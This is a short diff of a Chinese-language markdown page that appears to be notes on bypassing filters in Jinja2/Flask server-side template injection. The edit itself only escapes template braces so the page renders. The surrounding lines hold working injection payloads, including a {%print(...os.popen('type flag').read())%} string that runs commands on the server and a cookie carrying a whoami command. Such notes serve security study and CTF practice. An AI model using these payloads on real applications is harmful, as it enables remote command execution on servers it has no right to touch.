@@ -435,9 +435,9 @@ dict.setdefault(key, default=None)
 cookie: os=os;command=whoami
 ```
 
-## 过滤 {{ / }}
+## 过滤 {% raw %} {{ / }} {% endraw %}
 
-还可以用{%%}
+还可以用 {% raw %} {%%} {% endraw %}
 
 ```python
 name={%print(config.__class__.__init__.__globals__['os'].popen('type flag').read())%}
